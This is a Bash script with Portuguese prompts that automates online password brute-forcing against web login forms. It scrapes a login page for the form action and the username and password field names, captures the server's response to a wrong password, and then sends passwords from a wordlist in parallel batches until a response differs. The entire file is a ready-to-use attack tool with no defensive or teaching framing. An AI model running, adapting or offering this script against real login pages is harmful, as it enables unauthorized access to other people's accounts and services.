#!/bin/bash

clear
echo -e "\e[1;32m==== BRUTE FORCE PRO TERMINUX [100% AUTOMÁTICO] ====\e[0m"

read -p "🔗 URL da página de login (não o action): " page_url
[ -z "$page_url" ] && echo -e "\e[1;31m❌ URL obrigatória.\e[0m" && exit 1

echo -e "\e[1;34m▶️ Analisando a página...\e[0m"
html=$(curl -s "$page_url")

# Detectar action do formulário
action=$(echo "$html" | grep -oP '(?<=<form[^>]*action=["'"'"']).*?(?=["'"'"'])' | head -n1)
if [[ "$action" != http* ]]; then
  action="${page_url%/}/$action"
fi
echo -e "📤 Form Action detectado: \e[1;33m$action\e[0m"

# Detectar campos de usuário e senha
userfield=$(echo "$html" | grep -oiP 'name=["'"'"']\K[^"'"'"']+(?=["'"'"'][^>]*type=["'"'"']?(text|email)["'"'"']?)' | head -n1)
passfield=$(echo "$html" | grep -oiP 'name=["'"'"']\K[^"'"'"']+(?=["'"'"'][^>]*type=["'"'"']?password["'"'"']?)' | head -n1)

echo -e "🖋️ Campo de usuário detectado: \e[1;33m$userfield\e[0m"
echo -e "🖋️ Campo de senha detectado: \e[1;33m$passfield\e[0m"

read -p "👤 Usuário: " user
[ -z "$user" ] && echo -e "\e[1;31m❌ Usuário obrigatório.\e[0m" && exit 1

# Captura a resposta base para senha ERRADA
echo -e "\e[1;34m▶️ Capturando resposta padrão de senha ERRADA...\e[0m"
resposta_errada=$(curl -s -X POST "$action" -d "$userfield=$user&$passfield=senha_incorreta_teste")

read -p "🔑 Senha personalizada (ENTER para lista): " senha

testar_senha() {
  local pwd=$1
  resp=$(curl -s -X POST "$action" -d "$userfield=$user&$passfield=$pwd")

  if [[ "$resp" != "$resposta_errada" ]]; then
    echo -e "\e[1;32m✅ SENHA ENCONTRADA: $pwd\e[0m"
    kill 0 2>/dev/null
    exit 0
  else
    echo -e "\e[0;31m❌ $pwd\e[0m"
  fi
}

if [ -z "$senha" ]; then
  read -p "📂 Nome do arquivo de senhas (.txt): " wordlist
  [ ! -f "$wordlist" ] && echo -e "\e[1;31m❌ Arquivo não encontrado.\e[0m" && exit 1
  echo -e "\e[1;34m▶️ Iniciando brute-force...\e[0m"

  max_procs=10
  count=0

  while IFS= read -r pwd; do
    testar_senha "$pwd" &
    ((count++))
    if (( count % max_procs == 0 )); then
      wait
    fi
  done < "$wordlist"

  wait
  echo -e "\e[1;33m🔔 Fim da lista.\e[0m"

else
  echo -e "\e[1;34m▶️ Testando senha personalizada: $senha\e[0m"
  testar_senha "$senha"
fi
